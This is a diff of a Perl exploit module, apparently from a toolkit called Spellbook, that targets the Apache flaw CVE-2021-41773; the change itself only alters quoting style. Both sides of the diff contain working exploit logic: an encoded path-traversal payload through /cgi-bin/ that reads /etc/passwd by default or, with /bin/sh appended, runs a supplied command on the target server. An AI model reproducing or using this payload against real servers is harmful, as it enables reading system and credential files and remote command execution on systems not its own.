@@ -23,13 +23,13 @@ package Spellbook::Advisory::CVE_2021_41773 {
             }
 
             if (!$file) {
-                $file = "/etc/passwd";
+                $file = '/etc/passwd';
             }
 
-            my $payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/";
+            my $payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/';
 
             if ($command) {
-                $payload = $payload . "/bin/sh";
+                $payload = $payload . '/bin/sh';
             }
 
             if (!$command) {
@@ -38,8 +38,8 @@ package Spellbook::Advisory::CVE_2021_41773 {
 
             my $useragent = Spellbook::Core::UserAgent -> new();
             my $request   = $useragent -> get(
-               "https://" . $target . $payload,
-                Content => $command || " "
+               'https://' . $target . $payload,
+                Content => $command || ' '
             );
 
             if ($request -> code() == 200) {
